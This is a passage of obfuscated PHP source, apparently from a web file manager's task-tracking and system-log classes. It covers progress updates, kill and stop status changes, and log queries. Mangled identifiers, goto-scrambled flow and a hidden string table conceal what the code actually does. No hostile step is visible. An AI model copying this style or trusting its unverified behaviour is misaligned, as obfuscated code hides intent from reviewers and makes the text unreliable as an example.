taskRun($FÆç˜¹æ‰ì) { goto a°‘çĞÁ; a°‘çĞÁ: $aç£¶ø =& $_SERVER[›èö’ù¤]; self::log($aç£¶ø[1536] . $FÆç˜¹æ‰ì[$aç£¶ø[395]] . $aç£¶ø[1537] . $FÆç˜¹æ‰ì[$aç£¶ø[28]] . $aç£¶ø[1538] . $FÆç˜¹æ‰ì[$aç£¶ø[1539]]); Model($aç£¶ø[1520])->run($FÆç˜¹æ‰ì[$aç£¶ø[395]]); goto FíÓŠ´–ã; BˆÏ¯•¹¼Ã: return !0; goto a‡áë‹Ñ¢É; Fìˆ±ĞôÂ…: Model($aç£¶ø[1540])->add(array($aç£¶ø[1541] => $aç£¶ø[33], $aç£¶ø[1542] => $aç£¶ø[191], $aç£¶ø[29] => $aç£¶ø[1543] . $FÆç˜¹æ‰ì[$aç£¶ø[395]], $aç£¶ø[1544] => json_encode(array($aç£¶ø[28] => $FÆç˜¹æ‰ì[$aç£¶ø[28]], $aç£¶ø[1545] => timeFloat() - $c íæºƒô¨, $aç£¶ø[291] => $E£õÎÎ—¾É)))); $b¤©¼è›¦« = $E£õÎÎ—¾É ? $aç£¶ø[1546] . $E£õÎÎ—¾É : $aç£¶ø[33]; self::log($aç£¶ø[1547] . $FÆç˜¹æ‰ì[$aç£¶ø[395]] . $aç£¶ø[531] . $b¤©¼è›¦«); goto BˆÏ¯•¹¼Ã; FíÓŠ´–ã: $c íæºƒô¨ = timeFloat(); $E£õÎÎ—¾É = $aç£¶ø[33]; switch ($FÆç˜¹æ‰ì[$aç£¶ø[29]]) { case $aç£¶ø[305]: $EøŞ¨¤Õ·ã = url_request($FÆç˜¹æ‰ì[$aç£¶ø[1539]], $aç£¶ø[228], !1, !1, !1, !1, 10); if ($EøŞ¨¤Õ·ã[$aç£¶ø[734]]) { $E£õÎÎ—¾É = strlen($EøŞ¨¤Õ·ã[$aç£¶ø[1112]]); } break; case $aç£¶ø[227]: $E£õÎÎ—¾É = Hook::apply($FÆç˜¹æ‰ì[$aç£¶ø[1539]]); default: break; } goto Fìˆ±ĞôÂ…; a‡áë‹Ñ¢É: } private static function valueGet($bñˆÈìŠ¿Û) { $Aø•‘†¢™Ñ =& $_SERVER[›èö’ù¤]; $bÆÓ˜ùù·á = $Aø•‘†¢™Ñ[1548]; $a‡èƒ‹ˆïš = Model($Aø•‘†¢™Ñ[427])->get($bñˆÈìŠ¿Û, $bÆÓ˜ùù·á); if (is_null($a‡èƒ‹ˆïš)) { Model($Aø•‘†¢™Ñ[427])->set($Aø•‘†¢™Ñ[734], $Aø•‘†¢™Ñ[87], $bÆÓ˜ùù·á); Model($Aø•‘†¢™Ñ[427])->set($Aø•‘†¢™Ñ[1514], $Aø•‘†¢™Ñ[191], $bÆÓ˜ùù·á); $a‡èƒ‹ˆïš = Model($Aø•‘†¢™Ñ[427])->get($bñˆÈìŠ¿Û, $bÆÓ˜ùù·á); } return $a‡èƒ‹ˆïš; } private static function valueSet($Fğ»·ôË±õ, $AêÚøóÈ¶²) { $bœŞö’»»ç =& $_SERVER[›èö’ù¤]; $Cœˆó“Î— = $bœŞö’»»ç[1549]; CacheLock::lock($Cœˆó“Î—); $côÊ‡áàø“ = Model($bœŞö’»»ç[427])->set($Fğ»·ôË±õ, $AêÚøóÈ¶², $bœŞö’»»ç[1548]); CacheLock::unlock($Cœˆó“Î—); return $côÊ‡áàø“; } protected static function log($DÍ¤˜ô¥ÕŸ) { write_log($DÍ¤˜ô¥ÕŸ, $_SERVER[›èö’ù¤][1535]); } private static function cacheClear() { $dÊåÈ÷‚ =& $_SERVER[›èö’ù¤]; Cache::clearMemory(Model($dÊåÈ÷‚[427])->cacheKey($dÊåÈ÷‚[1548])); Cache::clearMemory(Model($dÊåÈ÷‚[427])->cacheKey($dÊåÈ÷‚[1550])); Model($dÊåÈ÷‚[1520])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\156\156\x69\x6e\x67"; const STATYS_KILL = "\153\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($bæçŸŸĞÎ£, $e‰œä»¥Ï = '', $C «Æ±ˆ†£ = 0, $eö›à‡©º­ = '') { goto e¿æ‘Ó©¢Ş; f“Ò–îªµ: $GLOBALS[$b“–ÄšÑ÷[1557]] = 1; Hook::bind($b“–ÄšÑ÷[1516], array($this, $b“–ÄšÑ÷[1558])); Hook::bind($b“–ÄšÑ÷[1559], array($this, $b“–ÄšÑ÷[1560])); goto A•ñ¹©…É´; A•ñ¹©…É´: $this->startAfter(); Hook::trigger($b“–ÄšÑ÷[1561], $this->task); $this->task[$b“–ÄšÑ÷[1554]] = timeFloat(); goto F‘‡Œ¸ÇéŠ; e¿æ‘Ó©¢Ş: $b“–ÄšÑ÷ =& $_SERVER[›èö’ù¤]; if (self::get($bæçŸŸĞÎ£)) { return; } $this->task = array($b“–ÄšÑ÷[395] => $bæçŸŸĞÎ£, $b“–ÄšÑ÷[1551] => USER_ID, $b“–ÄšÑ÷[1454] => $eö›à‡©º­, $b“–ÄšÑ÷[29] => $e‰œä»¥Ï, $b“–ÄšÑ÷[1048] => $b“–ÄšÑ÷[33], $b“–ÄšÑ÷[1046] => $C «Æ±ˆ†£, $b“–ÄšÑ÷[1060] => 0, $b“–ÄšÑ÷[1552] => 0, $b“–ÄšÑ÷[1553] => 0, $b“–ÄšÑ÷[773] => timeFloat(), $b“–ÄšÑ÷[772] => 0, $b“–ÄšÑ÷[1554] => 0, $b“–ÄšÑ÷[1555] => 0, $b“–ÄšÑ÷[1556] => 0, $b“–ÄšÑ÷[734] => $b“–ÄšÑ÷[1514]); goto f“Ò–îªµ; F‘‡Œ¸ÇéŠ: } public function end() { goto FåçïÈ½°±; FåçïÈ½°±: $EÃÃ‹¶ˆ =& $_SERVER[›èö’ù¤]; if (!$this->task) { return; } if ($this->task[$EÃÃ‹¶ˆ[1554]]) { self::valueSet($this->task[$EÃÃ‹¶ˆ[395]], !1); } goto A§­± æÑ; EÒÆùÖí‰œ: Hook::unbind($EÃÃ‹¶ˆ[1559], array($this, $EÃÃ‹¶ˆ[1560])); $this->endAfter(); $this->task = !1; goto EÃ’“–»‡; A§­± æÑ: $aÎí²õù’« = timeFloat() - $this->task[$EÃÃ‹¶ˆ[773]]; self::log($EÃÃ‹¶ˆ[1562] . $this->task[$EÃÃ‹¶ˆ[395]] . $EÃÃ‹¶ˆ[1563] . $aÎí²õù’« . $EÃÃ‹¶ˆ[1564]); Hook::unbind($EÃÃ‹¶ˆ[1516], array($this, $EÃÃ‹¶ˆ[1558])); goto EÒÆùÖí‰œ; EÃ’“–»‡: } public function update($bí¦Ÿˆ¦ÇË = 0, $CèÉ‚õ§Ş = false) { goto eŠ·½æÚåØ; eŠ·½æÚåØ: $BÛ¸ÒˆÅùù =& $_SERVER[›èö’ù¤]; $B¤Ï„ÏñÓƒ =& $this->task; if (!$B¤Ï„ÏñÓƒ) { return; } goto d¿«Î²¨Ô; Eê¾©Œ•¬¨: Hook::trigger($BÛ¸ÒˆÅùù[1568], $B¤Ï„ÏñÓƒ); self::valueSet($B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[395]], $B¤Ï„ÏñÓƒ); goto e‹Ñ¿Ú‹•; A©™ß±£°Á: $D«¦î°†‘— = self::get($B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[395]]); $b½‰¢ªÄ×ò = $D«¦î°†‘—[$BÛ¸ÒˆÅùù[734]]; if ($b½‰¢ªÄ×ò == self::STATYS_KILL) { $c¸Õ–£Ç› = array($BÛ¸ÒˆÅùù[1565] => LNG($BÛ¸ÒˆÅùù[1566]), $BÛ¸ÒˆÅùù[1110] => !1); Cache::set($BÛ¸ÒˆÅùù[1567] . $this->task[$BÛ¸ÒˆÅùù[395]], $c¸Õ–£Ç›, 30); $this->onKill(); $this->end(); die; } else { if ($b½‰¢ªÄ×ò == self::STATYS_STOP) { $A”î¯ª¢èˆ = 2; $D«¦î°†‘—[$BÛ¸ÒˆÅùù[1555]] += $A”î¯ª¢èˆ; self::valueSet($B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[395]], $D«¦î°†‘—); sleep($A”î¯ª¢èˆ); $this->update(); return; } } goto D¹‘ßÏÙÀ; fÉ¿í‡ö§°: $this->updateAfter(); $dèĞöİÉÀï = 0.2; if (timeFloat() - $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1554]] < $dèĞöİÉÀï && !$CèÉ‚õ§Ş) { return; } goto A©™ß±£°Á; D¹‘ßÏÙÀ: $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[734]] = $b½‰¢ªÄ×ò ? $b½‰¢ªÄ×ò : $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[734]]; $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1555]] = $D«¦î°†‘—[$BÛ¸ÒˆÅùù[1555]] ? $D«¦î°†‘—[$BÛ¸ÒˆÅùù[1555]] : 0; $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1554]] = timeFloat(); goto Eê¾©Œ•¬¨; d¿«Î²¨Ô: $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1060]] += $bí¦Ÿˆ¦ÇË; $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[772]] = timeFloat(); if ($B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1046]]) { if ($B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1046]] < $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1060]]) { $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1046]] = $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1060]]; } $B«óÏ§¬ÅÎ = timeFloat() - $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[773]] - $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1555]]; $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1552]] = $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1060]] / $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1046]]; $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1553]] = $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1060]] / $B«óÏ§¬ÅÎ; if ($B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1552]] > 0) { $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1556]] = $B«óÏ§¬ÅÎ * (1 - $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1552]]) / $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1552]]; } $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1556]] = $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1556]] <= 0 ? 0 : $B¤Ï„ÏñÓƒ[$BÛ¸ÒˆÅùù[1556]]; } goto fÉ¿í‡ö§°; e‹Ñ¿Ú‹•: } public function onKillSet($Cˆç“…ñ›‡, $b½åÆÀ¸İ = array()) { $this->onKillCall = array($Cˆç“…ñ›‡, $b½åÆÀ¸İ); } public function onKill() { $e†å¥¢›é¥ =& $_SERVER[›èö’ù¤]; self::log($e†å¥¢›é¥[1562] . $this->task[$e†å¥¢›é¥[395]] . $e†å¥¢›é¥[1569]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($b©¡–¡İ›é) { $a˜ôï®çĞ² =& $_SERVER[›èö’ù¤]; Cache::set($a˜ôï®çĞ²[1567] . $this->task[$a˜ôï®çĞ²[395]], $b©¡–¡İ›é, 60); return $b©¡–¡İ›é; } public static function get($cÒà‹”Ä¥ò) { $få”“îˆÏ¡ =& $_SERVER[›èö’ù¤]; $F”ôÇ÷Œ¸ = self::valueGet($cÒà‹”Ä¥ò); if (is_array($F”ôÇ÷Œ¸) && $F”ôÇ÷Œ¸[$få”“îˆÏ¡[1570]]) { $B ƒ™§ Õ = ActionApply($F”ôÇ÷Œ¸[$få”“îˆÏ¡[1570]], array($F”ôÇ÷Œ¸)); $F”ôÇ÷Œ¸ = is_array($B ƒ™§ Õ) ? $B ƒ™§ Õ : $F”ôÇ÷Œ¸; } return $F”ôÇ÷Œ¸; } public static function listData() { $f¡ïéÇĞÁ– = self::valueGet(); return array_sort_by($f¡ïéÇĞÁ–, $_SERVER[›èö’ù¤][773], !0); } public static function kill($e àË¼ÌÙ) { return self::changeStatus($e àË¼ÌÙ, self::STATYS_KILL); } public static function stop($fİÇÚŸÃ‘æ) { return self::changeStatus($fİÇÚŸÃ‘æ, self::STATYS_STOP); } public static function restart($A²¤õÛÎÕ´) { return self::changeStatus($A²¤õÛÎÕ´, self::STATYS_RUNNING); } public static function killAll() { $AˆÊÛŞºë =& $_SERVER[›èö’ù¤]; $CíéÙº†ô¬ = self::listData(); foreach ($CíéÙº†ô¬ as $FÍò…ÃŠğÖ) { self::kill($FÍò…ÃŠğÖ[$AˆÊÛŞºë[395]]); } sleep(2); foreach ($CíéÙº†ô¬ as $FÍò…ÃŠğÖ) { self::valueSet($FÍò…ÃŠğÖ[$AˆÊÛŞºë[395]], !1); } } private static function changeStatus($A‘·Ã—…œÔ, $b´ÚŒ†Á·Ì) { goto A˜ì©ÀÚ; A˜ì©ÀÚ: $E¯Îğù±óò =& $_SERVER[›èö’ù¤]; $C˜ŞÆ —õÅ = self::valueGet($A‘·Ã—…œÔ); if (!$C˜ŞÆ —õÅ) { return !1; } goto Aß´ æùâ»; Aß´ æùâ»: $C˜ŞÆ —õÅ[$E¯Îğù±óò[734]] = $b´ÚŒ†Á·Ì; self::valueSet($A‘·Ã—…œÔ, $C˜ŞÆ —õÅ); self::log($E¯Îğù±óò[1571] . $C˜ŞÆ —õÅ[$E¯Îğù±óò[395]] . $E¯Îğù±óò[1572] . $b´ÚŒ†Á·Ì); goto A‘Æƒ½¶Ñ; A‘Æƒ½¶Ñ: return !0; goto DÇôŠã»ˆê; DÇôŠã»ˆê: } public static function valueGet($D÷Üßù„¬É = false) { $dÆÂáŠÒó‹ =& $_SERVER[›èö’ù¤]; if ($D÷Üßù„¬É) { $FÔµ¤¥í¥ = Model($dÆÂáŠÒó‹[440])->where(array($dÆÂáŠÒó‹[93] => $D÷Üßù„¬É, $dÆÂáŠÒó‹[29] => $dÆÂáŠÒó‹[1573]))->find(); return $FÔµ¤¥í¥ ? json_decode($FÔµ¤¥í¥[$dÆÂáŠÒó‹[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($c©‘‘„¤ = false) { goto fõµâ°¦; c·†¶«†Á„: $D©±ù‰¾İë = Model($E×È¦ÜÜˆ[440])->where($d™¬î«–İ)->select(); $D©±ù‰¾İë = $D©±ù‰¾İë ? $D©±ù‰¾İë : array(); foreach ($D©±ù‰¾İë as $Fƒ…ï‹ğåÓ => $cÖ¿ßÉå®) { $D©±ù‰¾İë[$Fƒ…ï‹ğåÓ] = json_decode($cÖ¿ßÉå®[$E×È¦ÜÜˆ[372]], !0); } goto Aé¼—µ»Ñõ; Aé¼—µ»Ñõ: return $D©±ù‰¾İë; goto b¨Ä‘Û÷¬; fõµâ°¦: $E×È¦ÜÜˆ =& $_SERVER[›èö’ù¤]; $d™¬î«–İ = array($E×È¦ÜÜˆ[29] => $E×È¦ÜÜˆ[1573]); if ($c©‘‘„¤) { $d™¬î«–İ[$E×È¦ÜÜˆ[1551]] = $c©‘‘„¤; } goto c·†¶«†Á„; b¨Ä‘Û÷¬: } public static function valueSet($A¿ÇÈ–óÈ, $eõ¤å´ÈŸ“) { goto c©íŸ±ñ©Æ; EÎÏÛŸ·çË: $bóÖˆŞ¯Šå = $C¡ŒëÚÅª»[1575]; CacheLock::lock($bóÖˆŞ¯Šå); Model($C¡ŒëÚÅª»[440])->add($A¬†õ¶‚, array(), !0); goto e¿ÇÄÖ«ŒŒ; Açé‡ºë–ô: if (!$f¦×£šµ×­) { ob_start(); var_dump($eõ¤å´ÈŸ“); $b°ß£‹ÂæÙ = ob_get_clean(); self::log($C¡ŒëÚÅª»[1574] . json_encode_force($b°ß£‹ÂæÙ)); } if (!$A¿ÇÈ–óÈ || !$eõ¤å´ÈŸ“[$C¡ŒëÚÅª»[395]]) { return !1; } $A¬†õ¶‚ = array($C¡ŒëÚÅª»[29] => $C¡ŒëÚÅª»[1573], $C¡ŒëÚÅª»[1551] => USER_ID, $C¡ŒëÚÅª»[93] => $A¿ÇÈ–óÈ, $C¡ŒëÚÅª»[372] => $f¦×£šµ×­); goto EÎÏÛŸ·çË; e¿ÇÄÖ«ŒŒ: CacheLock::unlock($bóÖˆŞ¯Šå); goto b‚Ú•¾Êø; c©íŸ±ñ©Æ: $C¡ŒëÚÅª» =& $_SERVER[›èö’ù¤]; if (!$eõ¤å´ÈŸ“) { return Model($C¡ŒëÚÅª»[440])->where(array($C¡ŒëÚÅª»[93] => $A¿ÇÈ–óÈ, $C¡ŒëÚÅª»[29] => $C¡ŒëÚÅª»[1573]))->delete(); } $f¦×£šµ×­ = json_encode($eõ¤å´ÈŸ“); goto Açé‡ºë–ô; b‚Ú•¾Êø: } public static function log($EÒœ·ùÆ¨) { if (!GLOBAL_DEBUG) { return; } write_log($EÒœ·ùÆ¨, $_SERVER[›èö’ù¤][1576]); } } goto aéÅ³™¸Ì; A—¶î„òÄ¶: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\124\x69\155\145", "\164\x69\x6d\145", "\151\156\x73\x65\162\x74", "\x66\165\x6e\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $cÒ‹‡ç =& $_SERVER[›èö’ù¤]; return array($cÒ‹‡ç[2034] => LNG($cÒ‹‡ç[2035]), $cÒ‹‡ç[2036] => LNG($cÒ‹‡ç[2037]), $cÒ‹‡ç[1660] => LNG($cÒ‹‡ç[2038]), $cÒ‹‡ç[2039] => LNG($cÒ‹‡ç[2040]), $cÒ‹‡ç[2041] => LNG($cÒ‹‡ç[2042]), $cÒ‹‡ç[2043] => LNG($cÒ‹‡ç[2044]), $cÒ‹‡ç[2045] => LNG($cÒ‹‡ç[2046]), $cÒ‹‡ç[1690] => LNG($cÒ‹‡ç[2046]), $cÒ‹‡ç[1691] => LNG($cÒ‹‡ç[2047]), $cÒ‹‡ç[2048] => LNG($cÒ‹‡ç[2049]), $cÒ‹‡ç[2050] => LNG($cÒ‹‡ç[2051]), $cÒ‹‡ç[2052] => LNG($cÒ‹‡ç[2053]), $cÒ‹‡ç[2054] => LNG($cÒ‹‡ç[2055]), $cÒ‹‡ç[1688] => LNG($cÒ‹‡ç[2056]), $cÒ‹‡ç[2057] => LNG($cÒ‹‡ç[2058]), $cÒ‹‡ç[1695] => LNG($cÒ‹‡ç[2059]), $cÒ‹‡ç[2060] => LNG($cÒ‹‡ç[2061]), $cÒ‹‡ç[2062] => LNG($cÒ‹‡ç[2063]), $cÒ‹‡ç[2064] => LNG($cÒ‹‡ç[2065]), $cÒ‹‡ç[2066] => LNG($cÒ‹‡ç[2067]), $cÒ‹‡ç[1698] => LNG($cÒ‹‡ç[2068]), $cÒ‹‡ç[1699] => LNG($cÒ‹‡ç[2069]), $cÒ‹‡ç[2070] => LNG($cÒ‹‡ç[2071]), $cÒ‹‡ç[2072] => LNG($cÒ‹‡ç[2073]), $cÒ‹‡ç[2074] => LNG($cÒ‹‡ç[2075]), $cÒ‹‡ç[1693] => LNG($cÒ‹‡ç[2076]), $cÒ‹‡ç[2077] => LNG($cÒ‹‡ç[2078]), $cÒ‹‡ç[1692] => LNG($cÒ‹‡ç[2079]), $cÒ‹‡ç[2080] => LNG($cÒ‹‡ç[2081]), $cÒ‹‡ç[2082] => LNG($cÒ‹‡ç[2083]), $cÒ‹‡ç[2084] => LNG($cÒ‹‡ç[2085]), $cÒ‹‡ç[2086] => LNG($cÒ‹‡ç[2086]), $cÒ‹‡ç[2087] => LNG($cÒ‹‡ç[1664]), $cÒ‹‡ç[2088] => LNG($cÒ‹‡ç[2089]), $cÒ‹‡ç[2090] => LNG($cÒ‹‡ç[2091]), $cÒ‹‡ç[2092] => LNG($cÒ‹‡ç[2093]), $cÒ‹‡ç[2094] => LNG($cÒ‹‡ç[2095]), $cÒ‹‡ç[2096] => LNG($cÒ‹‡ç[2097]), $cÒ‹‡ç[2098] => LNG($cÒ‹‡ç[2098]), $cÒ‹‡ç[2099] => LNG($cÒ‹‡ç[2100]), $cÒ‹‡ç[2101] => LNG($cÒ‹‡ç[2102]), $cÒ‹‡ç[2103] => LNG($cÒ‹‡ç[2104]), $cÒ‹‡ç[2105] => LNG($cÒ‹‡ç[2106]), $cÒ‹‡ç[2107] => LNG($cÒ‹‡ç[2108]), $cÒ‹‡ç[2109] => LNG($cÒ‹‡ç[2110])); } private function typeFile() { $Eã·¦åÂÓ¸ =& $_SERVER[›èö’ù¤]; $F†î¸ÒÅÁó = array($Eã·¦åÂÓ¸[1695] => array($Eã·¦åÂÓ¸[1696]), $Eã·¦åÂÓ¸[2052] => array($Eã·¦åÂÓ¸[2111]), $Eã·¦åÂÓ¸[2054] => array($Eã·¦åÂÓ¸[2112]), $Eã·¦åÂÓ¸[1688] => array($Eã·¦åÂÓ¸[1689]), $Eã·¦åÂÓ¸[2062] => array(), $Eã·¦åÂÓ¸[2064] => array(), $Eã·¦åÂÓ¸[2066] => array(), $Eã·¦åÂÓ¸[1698] => array($Eã·¦åÂÓ¸[1700]), $Eã·¦åÂÓ¸[1699] => array($Eã·¦åÂÓ¸[1700]), $Eã·¦åÂÓ¸[2070] => array($Eã·¦åÂÓ¸[2113]), $Eã·¦åÂÓ¸[2072] => array($Eã·¦åÂÓ¸[2113]), $Eã·¦åÂÓ¸[2074] => array($Eã·¦åÂÓ¸[2114]), $Eã·¦åÂÓ¸[2060] => array($Eã·¦åÂÓ¸[2115]), $Eã·¦åÂÓ¸[1693] => array($Eã·¦åÂÓ¸[2116]), $Eã·¦åÂÓ¸[2077] => array($Eã·¦åÂÓ¸[2117]), $Eã·¦åÂÓ¸[1692] => array($Eã·¦åÂÓ¸[1694])); return $F†î¸ÒÅÁó; } private function typeAll() { goto dÔï®ˆƒİ™; b¢âõã‡ìß: foreach ($bÎª½´»­ as $fİïÚÄ…ÏÀ => $cÃç–Ô–¨ã) { $dñšï¿Š™…[$cÃç–Ô–¨ã[0]] = $dñšï¿Š™…[$fİïÚÄ…ÏÀ]; } $dñšï¿Š™…[$EÎÆ‰Ù®’Ä[1700]] = LNG($EÎÆ‰Ù®’Ä[2118]); $dñšï¿Š™…[$EÎÆ‰Ù®’Ä[2113]] = LNG($EÎÆ‰Ù®’Ä[2119]); goto a§¤æ‡âòë; dÔï®ˆƒİ™: $EÎÆ‰Ù®’Ä =& $_SERVER[›èö’ù¤]; $dñšï¿Š™… = $this->typeList; $bÎª½´»­ = array_filter($this->typeFile()); goto b¢âõã‡ìß; a§¤æ‡âòë: return $dñšï¿Š™…; goto C‚ŒéÁ›’; C‚ŒéÁ›’: } public function addLog($fˆ±Çëñ³, $FçÌÉÒ¶ = array()) { goto eò·ïé§—Ò; eò·ïé§—Ò: $FæİãºìÆ· =& $_SERVER[›èö’ù¤]; if (!isset($this->typeList[$fˆ±Çëñ³])) { return; } $bèéÔ–‚ = defined($FæİãºìÆ·[469]) && USER_ID ? USER_ID : (isset($FçÌÉÒ¶[$FæİãºìÆ·[1551]]) ? $FçÌÉÒ¶[$FæİãºìÆ·[1551]] : 0); goto DÈëÊ¸‰¿; DÈëÊ¸‰¿: if (!$bèéÔ–‚) { $bèéÔ–‚ = (int) Session::get($FæİãºìÆ·[1851]); } $Cİ«ñöµ÷ò = get_client_ip(); if (!$FçÌÉÒ¶ || strlen(json_encode($FçÌÉÒ¶)) >= 1024) { $FçÌÉÒ¶ = array($FæİãºìÆ·[2120] => $Cİ«ñöµ÷ò); } else { if (is_array($FçÌÉÒ¶)) { $FçÌÉÒ¶[$FæİãºìÆ·[2120]] = $Cİ«ñöµ÷ò; } else { $FçÌÉÒ¶ = array($FæİãºìÆ·[1112] => $FçÌÉÒ¶, $FæİãºìÆ·[2120] => $Cİ«ñöµ÷ò); } } goto aÄšœº«Ÿì; aÄšœº«Ÿì: $FçÌÉÒ¶ = array($FæİãºìÆ·[1541] => Session::sign(), $FæİãºìÆ·[1542] => $bèéÔ–‚, $FæİãºìÆ·[29] => $fˆ±Çëñ³, $FæİãºìÆ·[1544] => json_encode($FçÌÉÒ¶)); parent::add($FçÌÉÒ¶); goto fÑ¦Õ×™šˆ; fÑ¦Õ×™šˆ: } public function remove($aôéö­ˆœ¯) { $this->where(array($_SERVER[›èö’ù¤][414] => $aôéö­ˆœ¯))->delete(); } private function _makeOrder($fÖâ¯’¿‹– = '') { goto B•ÁâÉ›Íœ; C†çê™ÍËÓ: $Aâìøšˆòö = Input::get($f˜µõàİèï[451], $f˜µõàİèï[7], $f˜µõàİèï[1883], array($f˜µõàİèï[1807], $f˜µõàİèï[445])); $Aâìøšˆòö = $D×Øåêçˆ½[$Aâìøšˆòö]; $fÖâ¯’¿‹– = $fÖâ¯’¿‹– . "{$aØŞò‹ ¤í}\40{$Aâìøšˆòö}"; goto f¿×¥‰Ôæõ; f¿×¥‰Ôæõ: return $this->order($fÖâ¯’¿‹–); goto aˆ¤Ú•ë˜á; B•ÁâÉ›Íœ: $f˜µõàİèï =& $_SERVER[›èö’ù¤]; $aØŞò‹ ¤í = $f˜µõàİèï[194]; $D×Øåêçˆ½ = array($f˜µõàİèï[443] => $f˜µõàİèï[444], $f˜µõàİèï[445] => $f˜µõàİèï[446]); goto C†çê™ÍËÓ; aˆ¤Ú•ë˜á: } public function get($EìÕ‚¶¯‹¹ = '') { goto A°‘É²¶šà; d¡Äº„Ö÷: if (!empty($EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[2120]])) { $fÜñ†¨Ì“[$CŠ©Ù÷°¶Ó[446]] = array($CŠ©Ù÷°¶Ó[381], "\x25{$EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[2120]]}\45"); } $fàø† ô›İ = $this->_makeOrder()->where($fÜñ†¨Ì“)->selectPage(); if (empty($fàø† ô›İ[$CŠ©Ù÷°¶Ó[367]])) { show_json(array(), !0, $fàø† ô›İ[$CŠ©Ù÷°¶Ó[364]]); } goto B‚ŸôÊ‡Ã«; A°‘É²¶šà: $CŠ©Ù÷°¶Ó =& $_SERVER[›èö’ù¤]; if (!$EìÕ‚¶¯‹¹) { show_json(array()); } $fÜñ†¨Ì“ = array(); goto c®“ìµìæƒ; c®“ìµìæƒ: if ($EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[1551]]) { $fÜñ†¨Ì“[$CŠ©Ù÷°¶Ó[1551]] = $EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[1551]]; } if (isset($EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[745]])) { $e–˜‹“åÕí = $EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[745]]; $aº˜“ù·±‘ = isset($EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[491]]) ? $EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[491]] : time(); $fÜñ†¨Ì“[$CŠ©Ù÷°¶Ó[194]] = array($CŠ©Ù÷°¶Ó[331], array($e–˜‹“åÕí, $aº˜“ù·±‘)); } if ($EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[29]]) { $b‰ËÄ¥ÒÏ¶ = explode($CŠ©Ù÷°¶Ó[47], $EìÕ‚¶¯‹¹[$CŠ©Ù÷°¶Ó[29]]); $CäƒÈàË¹î = $this->typeFile(); $B¼¦â«Œßƒ = array(); foreach ($b‰ËÄ¥ÒÏ¶ as $CËÒôŸÎİÊ) { $B¼¦â«Œßƒ[] = $CËÒôŸÎİÊ; if (isset($CäƒÈàË¹î[$CËÒôŸÎİÊ])) { $B¼¦â«Œßƒ = array_merge($B¼¦â«Œßƒ, $CäƒÈàË¹î[$CËÒôŸÎİÊ]); } } $B¼¦â«Œßƒ = array_unique($B¼¦â«Œßƒ); if ($B¼¦â«Œßƒ) { $fÜñ†¨Ì“[$CŠ©Ù÷°¶Ó[29]] = array($CŠ©Ù÷°¶Ó[7], $B¼¦â«Œßƒ); } } else { $fÜñ†¨Ì“[$CŠ©Ù÷°¶Ó[29]] = array($CŠ©Ù÷°¶Ó[2121], $CŠ©Ù÷°¶Ó[2122]); } goto d¡Äº„Ö÷; B‚ŸôÊ‡Ã«: $fàø† ô›İ[$CŠ©Ù÷°¶Ó[367]] = $this->logList($fàø† ô›İ[$CŠ©Ù÷°¶Ó[367]]); return $fàø† ô›İ; goto A‰Ï‹Äö£ƒ; A‰Ï‹Äö£ƒ: } private function ipAddress(&$CÍØ†¡‰¬) { $BÀ„õæ²¥ =& $_SERVER[›èö’ù¤]; if (!empty($CÍØ†¡‰¬[$BÀ„õæ²¥[2120]])) { $dÊáò’˜öÉ = IpLocation::get($CÍØ†¡‰¬[$BÀ„õæ²¥[2120]]); } else { $dÊáò’˜öÉ = LNG($BÀ„õæ²¥[2123]); } $CÍØ†¡‰¬[$BÀ„õæ²¥[2124]] = $dÊáò’˜öÉ; } private function descZipDownload($cöµáÌ­ª, 